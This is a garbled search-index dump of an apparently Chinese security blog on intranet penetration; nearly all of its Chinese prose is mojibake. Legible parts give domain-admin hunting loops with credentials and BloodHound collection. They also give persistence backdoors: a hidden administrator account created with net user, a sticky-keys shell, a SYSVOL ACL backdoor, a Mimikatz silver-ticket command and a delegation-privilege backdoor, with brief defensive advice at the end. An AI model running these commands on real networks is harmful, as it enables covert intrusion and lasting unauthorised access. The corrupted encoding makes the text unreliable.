å¯¹ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œè®¡ç®—æœºåï¼ŒåŸŸåï¼ŒåŸŸæ—åç§°ï¼ŒNetBIOSæœºå™¨åï¼Œå·¥ä½œç»„ï¼Œç³»ç»Ÿæ—¶é—´ç­‰ä¿¡æ¯ smb-os-discovery powerviewè„šæœ¬ Invoke-StealthUserHunter Invoke-UserHunter Empire çš„ user_hunteræ¨¡å— usemode situational_awareness/network/powerview/user_hunter ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:10:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥æ‰¾åŸŸç®¡è¿›ç¨‹ ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æœ¬æœºæ£€æŸ¥ è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨ net group \"Domain Admins\" /domain åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ· tasklist /v ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢åŸŸæ§çš„åŸŸç”¨æˆ·ä¼šè¯ https://github.com/nullbind/Other-Projects/tree/master/GDA ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡ é¦–å…ˆï¼Œä»Domain Adminsç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨ ç„¶åï¼Œå°†ç›®æ ‡ ip åŠ åˆ° ips.txt ï¼Œå°†æ”¶é›†çš„åŸŸç®¡ç†å‘˜åˆ—è¡¨åŠ åˆ° names.txt æ–‡ä»¶ã€‚ FOR /F %i in (ips.txt) DO @echo [+] %i \u0026\u0026 @tasklist /V /S %i /U user /P password 2\u003eNUL \u003e output.txt \u0026\u0026 FOR /F %n in (names.txt) DO @type output.txt | findstr %n \u003e NUL \u0026\u0026 echo [!] %n was found running a process on %i \u0026\u0026 pause ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰«æè¿œç¨‹ç³»ç»Ÿçš„ NetBIOS ä¿¡æ¯ é¦–å…ˆï¼Œä»Domain Adminsç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨ ç„¶åï¼Œå°†ç›®æ ‡ ip åŠ åˆ° ips.txt ï¼Œå°†æ”¶é›†çš„åŸŸç®¡ç†å‘˜åˆ—è¡¨åŠ åˆ° admins.txt ` æ–‡ä»¶ã€‚ for /F %i in (ips.txt) do @echo [+] Checking %i \u0026\u0026 nbtstat -A %i 2\u003eNUL \u003enbsessions.txt \u0026\u0026 FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u003e NUL \u0026\u0026 echo [!] %n was found logged into %i ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"BloodHound å·¥å…· brew services start neo4j æ”¶é›†è„šæœ¬ https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors SharpHound.exe -c all ","date":"2020-02-13","objectID":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/:11:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","ä¿¡æ¯æ”¶é›†"],"title":"å†…ç½‘ä¿¡æ¯æ”¶é›†","uri":"/2020/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘æ¸—é€æµç¨‹ä»‹ç»","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å†…ç½‘æ¸—é€æµç¨‹ ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 Initial Access åŸºç¡€ Web æ¼æ´ (å¼±å£ä»¤ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€RCEã€ååºåˆ—åŒ–) å„ç±»åŸºç¡€æœåŠ¡ 0/1/N Day RCE (vsftpdã€ Sambaã€ fastcgi) ä¸ªäººæœº(é’“é±¼æ‰“ç‚¹) ä¾›åº”é“¾æ”»å‡» VPNã€VNCã€TVç­‰ 0/1day ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 ç½‘ç»œä½ç½®åˆ¤æ–­ ç½‘ç»œåŒºåŸŸ DMZ ç”Ÿäº§ç½‘ åŠå…¬ç½‘ ä¸»æœºè§’è‰²åˆ¤æ–­ è¿ç»´ è¡Œæ”¿ â€¦ è¿é€šæ€§åˆ¤æ–­ icmp ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 Proxy å‡ºç½‘æµ‹è¯• exe or ps1 TCP / UDP / HTTP / HTTPS / DNS / ICMP Port or Socket ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 Recon Work Group or Domain Domain Admin or !Admin Command or Secret File ä¸»æœºå‘ç° 1.3.1 æµè§ˆå™¨å†å²åŠå¯†ç  Firefox Chrome â€¦ 1.3.2 RDP Logon event MSTSC history 1.3.3 å‡­æ®ç®¡ç†å™¨ Web å‡­æ® 1.3.4 ä¿¡æ¯æ”¶é›† ä»£ç† ç½‘ç»œå‘ç° 1.3.5 ç”¨æˆ·ç›‘æ§ ç™»å½•ç›‘æ§ æŒ‚ç›˜ç›‘æ§ ","date":"2020-02-11","objectID":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"å†…ç½‘æ¸—é€æµç¨‹","uri":"/2020/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"éšè”½åŸŸåé—¨åŸç†åŠå¤ç°","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"éšè”½åŸŸåé—¨ éšè—ç”¨æˆ· éšè”½ç¨‹åº ç²˜æ»é”® ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¸¸è§åé—¨æ–¹å¼ ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"éšè—ç”¨æˆ· net user yincang$ 123456qaq /add net localgroup administrators yincang$ /add ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"éšè”½ç¨‹åº NtGodMode NtGodMode.exe ä¸Šå¸ä¹‹é—¨ï¼Œä¸ç®¡ç®¡ç†å‘˜å¦‚ä½•æ›´æ”¹å£ä»¤å¯†ç ï¼Œå‡èƒ½ä»¥ä»»æ„å£ä»¤ç™»å½•ç³»ç»Ÿ https://blog.csdn.net/oceanark/article/details/51902042 https://www.jb51.net/article/14702.htm https://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=19817\u0026page=1 å‘½åç®¡é“ å‘½åç®¡é“ï¼Œ\\Server\\PipeName\\Path IP + Port æ˜¯å¸¸ç”¨çš„è¿œç¨‹è¿æ¥æ–¹å¼å‘½åç®¡é“ä¸éœ€è¦ç‰¹å®šçš„ç«¯å£ï¼Œæ··æ‚åœ¨135ç«¯å£ä¸­ã€‚ å®ç°ä¸å¼€ç«¯å£çš„æƒ…å†µä¸‹ç™»å½• ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç²˜æ»é”® äº”æ¬¡è¿ç»­æŒ‰ä¸‹ shift é”®ï¼Œä¼šå¼¹å‡ºè¾“å…¥æ³•é€‰æ‹©å™¨ã€‚å¯ä»¥å°† cmd æ›¿æ¢è¾“å…¥æ³•ï¼Œè·å– Shell ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå†…éšè”½åé—¨ ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç›®å½• ACL ä¸€ç§åŸºäºåŸŸå†…å¯¹è±¡ ACL(Access Control Link)è®¿é—®æ§åˆ¶é“¾çš„æ·±åº¦éšè—åé—¨ã€‚ åŸŸç½‘ç»œä¸­ï¼ŒåŸŸçš„ç»„ç­–ç•¥å’Œè„šæœ¬å­˜æ”¾åœ¨åŸŸæœåŠ¡å™¨çš„ SYSVOL ç›®å½•ï¼Œæ‰€æœ‰åŸŸç”¨æˆ·å‡å¯è‡ªç”±è®¿é—®ï¼Œä½†åªæœ‰éƒ¨åˆ†é«˜æƒé™ç”¨æˆ·æ‰æœ‰ä¿®æ”¹æƒé™ã€‚åŸŸå†…è´¦å·åœ¨ç™»å½•åŸŸæ—¶ï¼Œä¼šæŸ¥è¯¢ã€ æ‰§è¡Œ(å¦‚æœæœ‰å˜åŒ–)å±äºè‡ªå·±çš„åŸŸç­–ç•¥ã€æ‰§è¡Œè„šæœ¬ã€‚ ä¸€å®šç¨‹åº¦ä¸Šè¯´ï¼Œæ§åˆ¶äº† SYSVOL ç›®å½•ï¼Œå°±æœ‰å¾ˆå¤§æ¦‚ç‡æ§åˆ¶åŸŸç½‘ç»œã€‚ å¦‚æœåŸŸä¸­éƒ¨ç½²äº†ç™»å½•æ—¥å¿—å®¡è®¡è½¯ä»¶ï¼Œåˆ™ä¼šä¸¥æ ¼å®¡è®¡åŸŸå†…é«˜æƒé™è´¦å·çš„ç™»å½•ã€ä½¿ç”¨æƒ…å†µã€‚æ‰€ä»¥ä½¿ç”¨é«˜æƒé™ç”¨æˆ·æ§åˆ¶åŸŸç½‘ç»œçš„æ–¹å¼ï¼Œéšè”½æ€§å¹¶ä¸é«˜ ä¸€èˆ¬æ¥è¯´ï¼ŒåŸŸç­–ç•¥ä¼šå¼ºåˆ¶å‘¨æœŸæ€§ä¿®æ”¹é«˜æƒé™ç”¨æˆ·çš„å¯†ç ï¼Œä½†æ˜¯å¯¹ä½æƒé™ç”¨æˆ·æ¥è¯´ä¸ä¸€å®šæœ‰è¿™ä¸ªå¼ºåˆ¶æ€§è¦æ±‚ï¼Œè€Œä¸”åŸŸä¸­å¾€å¾€æœ‰å¾ˆå¤šç”¨æˆ·å‡ ä¹ä¸æ€ä¹ˆç™»å½•ã€ä½¿ç”¨ã€‚ å¦‚æœä½æƒé™ç”¨æˆ·å…·å¤‡ SYSVOL ç›®å½•çš„ä¿®æ”¹æƒé™ï¼Œç™»å½•åŸŸæ—¶ï¼Œå› ä¸ºæƒé™ä¸é«˜ï¼Œä¸ä¼šè¢«å®¡è®¡è½¯ä»¶å‘ç°ã€‚ç°åœ¨çš„é˜²æŠ¤ã€ç›‘æ§ç±»è½¯ä»¶è¿˜æ²¡æœ‰è¿‡å¤šå…³æ³¨ç›®å½•çš„ACLï¼Œå› æ­¤è¿™ç§æ–¹å¼æ˜¯ä¸€ç§å¾ˆå®ç”¨çš„éšè”½åé—¨æ–¹å¼ã€‚ ä½¿ç”¨æ™®é€šç”¨æˆ· eviluser ç™»å½•åŸŸå®¢æˆ·ç«¯ Windows 7ã€‚é€šè¿‡net useè¿æ¥åŸŸæœåŠ¡å™¨ï¼Œå¯æŸ¥çœ‹è®¿é—®æœåŠ¡å™¨å…±äº«çš„ç›®å½•ï¼Œä½†æ˜¯æ²¡æœ‰å†™æƒé™ã€‚ é€šè¿‡èµ„æºç®¡ç†å·¥å…·ç»™ Policies ç›®å½•æ·»åŠ äº†å†™æƒé™(ä¹Ÿå¯ä»¥æ˜¯å®Œå…¨æ§åˆ¶æƒ)ï¼Œå¹¶ç»§æ‰¿ç»™æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ Policies ç›®å½•çš„å®‰å…¨é€‰é¡¹å¡ï¼Œeviluser å•ç‹¬ä½œä¸ºæƒé™ç”¨æˆ·ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ™®é€šç”¨æˆ·éƒ½åªæœ‰ Authenticated users ç”¨æˆ·ç»„æƒé™ã€‚ æœåŠ¡å™¨ä¸­ç›®å½•çš„ ACL æƒé™è®¾ç½®æˆåŠŸåï¼Œåœ¨åŸæ¥çš„ IPC è¿æ¥ä¸­ï¼Œæ™®é€šåŸŸç”¨æˆ· eviluser æˆåŠŸåœ°å¾€ Policies ç›®å½•å†™å…¥ äº†æ•°æ®ï¼Œè¯æ˜å…·å¤‡äº†å¯¹è¯¥ç›®å½•çš„å†™å…¥æƒé™ã€‚ä»è€Œå¯ä»¥ä¿®æ”¹é‡Œé¢çš„ç­–ç•¥å’Œè„šæœ¬ï¼Œä¸€ç§éšè”½çš„åé—¨ã€‚ è¿™ç§åé—¨æ–¹å¼ï¼Œåªæ˜¯æ¼”ç¤ºäº† ACL åé—¨çš„ä¸€ç§å…·ä½“å½¢å¼ï¼Œå› ä¸ºåŸŸä¸­çš„å¯¹è±¡å¤ªå¤šï¼Œå¯ä»¥æ“æ§çš„ ACLå¯¹è±¡ä¹Ÿå¾ˆå¤šã€‚å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦ï¼Œçµæ´»é€‰æ‹©ç›®æ ‡çš„ACLä½œä¸ºç›®æ ‡è¿›è¡Œä¿®æ”¹ï¼ŒåŸ‹è—åé—¨ã€‚ å½“ç„¶å…³äº ACL çš„æ£€æµ‹ï¼Œå¾®è½¯ä¹Ÿæ¨å‡ºäº†ä¸“é—¨çš„å·¥å…·ï¼ŒACL Scanner ï¼Œå¦‚æœå‘¨æœŸæ€§åœ°æ˜¯ç”¨è¯¥å·¥å…·è¿›è¡Œæ£€æµ‹ï¼Œè¿˜æ˜¯èƒ½æ£€æµ‹åˆ°è¿™ç§ç±»å‹çš„åé—¨ã€‚ ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç™½é“¶ç¥¨æ® åœ¨ windows ç³»ç»Ÿä¸­ï¼Œè®¸å¤šæœåŠ¡ä»¥ä¸»æœºè´¦å·è¿è¡Œï¼Œå³è®¸å¤š ServiceAccount è´¦å·ä¸ºæœ¬æœºçš„ä¸»æœºè´¦å·ï¼Œæ ¼å¼ä¸º ComputerName$ã€‚ ä¸‹è¡¨æ˜¯å¸¸è§çš„ä»¥ä¸»æœºè´¦å·è¿è¡Œçš„æœåŠ¡ã€‚å³è¾¹ä¸€æ ä¸­æœ‰äº›æœ‰å¤šä¸ªæœåŠ¡ï¼Œä¾‹å¦‚ WMI æœåŠ¡åŒ…æ‹¬ HOSTã€RPCSS è¿™ 2 ä¸ªæœåŠ¡ï¼Œè¡¨ç¤ºè®¿é—® WMI æœåŠ¡åŒæ—¶éœ€è¦ 2 ä¸ª TGS ç¥¨æ® æœåŠ¡åç§° åŒæ—¶éœ€è¦çš„æœåŠ¡ WMI HOSTã€RPCSS PowerShell Remoting HOSTã€HTTP WinRM HOSTã€HTTP Scheduled Tasks HOST Windows File Share CIFS LDAP LDAP Windows Remote Server RPCSSã€LDAPã€CIFS å·²çŸ¥åŸŸæœåŠ¡å™¨ä¸»æœºè´¦å·çš„å£ä»¤æ•£åˆ—å€¼ï¼Œä½¿ç”¨ Mimikatz çš„ç™½é“¶ç¥¨æ®åŠŸèƒ½ï¼Œä¼ªé€ è®¿é—® HOST æœåŠ¡çš„TGS ï¼Œä»¥åŸŸç®¡ç†å‘˜æƒé™è¿è¡ŒåŸŸæœåŠ¡å™¨çš„ SCHTASKS å‘½ä»¤ï¼Œè¿œç¨‹åˆ›å»ºã€æŸ¥çœ‹ã€åˆ é™¤ç³»ç»Ÿä»»åŠ¡ æ„é€ ç™½é“¶ç¥¨æ® kerberos::golden /admin:administrator@testlab.com /domain:testlab.com /sid:S-1-5-21-2390976136-1701108887-179272945 /target:TESTLABDC02.testlab.com /rc4:36788836f262b9409f102baa22b7a6f3 /service:host /ptt åˆ›å»ºè®¡åˆ’ä»»åŠ¡ ä¿®æ”¹ä¸»æœºè´¦å·çš„å£ä»¤ç­–ç•¥åˆ¶ä½œåé—¨ åœ¨ä¸»æœºçš„æ³¨å†Œè¡¨ä¸­ä¿®æ”¹ç­–ç•¥ï¼Œå…·ä½“ä½ç½®ä¸ºHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Netlogon\\Parametersï¼Œé”®å€¼ä¸º DisablePasswordChangeï¼Œè®¾ç½®ä¸º 1ï¼Œå³è¡¨ç¤ºç¦æ­¢ä¿®æ”¹è´¦å·å£ä»¤; åœ¨ç»„ç­–ç•¥ä¸­ä¿®æ”¹é»˜è®¤çš„ 30 å¤©ï¼Œä¿®æ”¹ä½ç½®ä¸º â€œComputer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Maximum machine account password age\"ï¼Œè®¾ç½®ä¸º 0 æ—¶ï¼Œè¡¨ç¤ºæ— é™é•¿; ç»„ç­–ç•¥ç›´æ¥ç¦æ­¢ä¿®æ”¹ä¸»æœºè´¦å·å£ä»¤ï¼Œç”¨æ¥æ”¯æŒ VDI(virtual desktops Infrastructure) ç­‰ç±»å‹çš„ä½¿ç”¨ï¼Œå…·ä½“ä½ç½®ä¸º â€œComputer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Disable machine account password changesâ€ æ–¹æ¡ˆ 1 è¾ƒä¸ºå®‰å…¨ã€‚ç”±äºç»„ç­–ç•¥å­˜åœ¨å¿«ç…§ï¼Œå› æ­¤æ–¹æ¡ˆ 2ã€3 é£é™©è¾ƒå¤§ ä¿®æ”¹ä¸»æœºè´¦å·çš„å§”æ´¾è®¾ç½®æƒé™åˆ¶ä½œåé—¨ åŸŸå§”æ´¾æ”»å‡»ä¸­ï¼Œä¸€ä¸ªä¸»æœºè´¦å·è¢«è®¾ç½®äº†çº¦æŸæ€§å§”æ´¾ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä¸»æœºè´¦å·çš„å£ä»¤æ•£åˆ—å€¼å’Œçº¦æŸæ€§å§”æ´¾è·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚å‰ææ¡ä»¶ä¸ºï¼šä¸»æœºè´¦å·çš„å£ä»¤æ•£åˆ—å€¼å’Œå§”æ´¾(çº¦æŸæ€§å’Œéçº¦æŸæ€§å‡å¯) å¦‚æœæˆ‘ä»¬åœ¨åŸŸå†…æœ‰å¤šä¸ªç¨³å®šçš„æ§åˆ¶ç‚¹ï¼Œä¸”è·å–äº†å½“å‰ç³»ç»Ÿçš„ SYSTEM æƒé™ï¼Œåˆ™éšæ—¶å¯è·å–å½“å‰ä¸»æœºçš„ä¸»æœºè´¦å· (æ¼”ç¤ºä¸­çš„è´¦å·ä¸º win7x86cn$ )å£ä»¤æ•£åˆ—å€¼ï¼Œæ»¡è¶³äº†ç¬¬ 1 ä¸ªæ¡ä»¶; å¦‚æœå°†è¯¥ win7x86cn$è´¦å·çš„ SeEnableDelegationPrivilege æƒé™èµ‹äºˆæœ¬æœºçš„ä½æƒé™ç™»å½•åŸŸç”¨æˆ· (eviluser) ï¼Œåˆ™é€šè¿‡ eviluser ç”¨æˆ·éšæ—¶å¯æ›´æ”¹ win7x86cn$ è´¦å·çš„å§”æ´¾è®¾ç½®ï¼Œä»è€Œå¯æ»¡è¶³ç¬¬ 2 ä¸ªæ¡ä»¶ å¹¶ä¸æ˜¯æ‹¥æœ‰ä¸€ä¸ªå¯¹è±¡çš„ GenericAll æƒé™ï¼Œå°±å¯ä»¥ä¿®æ”¹å¯¹è±¡çš„ msDS-AllowedToDelegateTo å±æ€§ï¼Œæ”»å‡»è€…åªæœ‰æ‹¥æœ‰å¯¹è±¡çš„ SeEnableDelegationPrivilege æƒé™æ—¶ï¼Œæ‰èƒ½ä¿®æ”¹ é»˜è®¤æƒ…å†µä¸‹ï¼ŒSeEnableDelegationPrivilege æƒé™åªæœ‰åŸŸæ§åˆ¶å™¨æ‰æœ‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ£€æµ‹åº”ç”¨åˆ°è¿™äº›åŸŸæ§åˆ¶å™¨ä¸Šçš„å“ªäº›ç»„ç­–ç•¥æ”¹å˜äº†ç”¨æˆ·çš„ SeEnableDelegationPrivilege æƒé™é…ç½® ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯é»˜è®¤ç»„ç­–ç•¥â€œDefault Domain Controllers Policyâ€ SeEnableDelegationPrivilege æƒé™å¾ˆç‰¹æ®Šï¼Œè®¾ç½®æ–¹æ³•ä¸ºä¿®æ”¹ GPO ç­–ç•¥æ–‡ä»¶ï¼Œä½ç½®ä¸ºåŸŸæœåŠ¡å™¨ä¸­\\SYSVOL\\sysvol\\testlab.com\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.infæ–‡ä»¶ æ·»åŠ  eviluser å…·å¤‡ SeEnableDelegationPrivilege æƒé™ï¼Œåˆ™ eviluser å¯ä¿®æ”¹åŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å§”æ´¾è®¾ç½®ã€‚ä¸‹å›¾æ˜¯æµ‹è¯•åœ¨ eviluser çš„ç™»å½•ä¼šè¯ä¸­ä¿®æ”¹ win7x86cn$ è´¦å·çš„å§”æ´¾è®¾ç½® æŸ¥çœ‹äº† win7x86cn è¿™ä¸ªè´¦å·çš„å§”æ´¾è®¾ç½®æƒ…å†µï¼Œæ ‡çº¢çš„ useraccountcontrol è¡¨ç¤ºæ²¡æœ‰è®¾ç½®å§”æ´¾ï¼Œä¸­é—´ä½¿ç”¨ Set-DomainObject è¿›è¡Œå§”æ´¾è®¾ç½®ï¼Œ16777216 è¡¨ç¤ºè®¾ç½® TRUS TED_TO_AUTH_FOR_DELEGATIONï¼Œé€šè¿‡Get-DomainObject æŸ¥è¯¢è®¾ç½®åçš„ç»“æœï¼Œæœ‰äº† msds-allowedtodelego é€‰é¡¹ï¼Œä¸” useraccountcontrol å‘ç”Ÿäº†å˜æ›´ã€‚ åº”å¯¹æ­¤åé—¨çš„å®‰å…¨ç­–ç•¥ é€šè¿‡åŸŸçš„ç»„ç­–ç•¥å¼ºåˆ¶è®¾ç½®ä¸»æœºè´¦å·çš„æœ€é•¿æœ‰æ•ˆæœŸä¸º 30 å¤©; ä¿æŠ¤ {6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.infæ–‡ä»¶ã€å³å…³é”®ç»„ç­–ç•¥çš„å®Œæ•´æ€§; é«˜æƒé™çš„ç”¨æˆ·ï¼Œè®¾ç½®ä¸èƒ½è¢«å§”æ´¾ 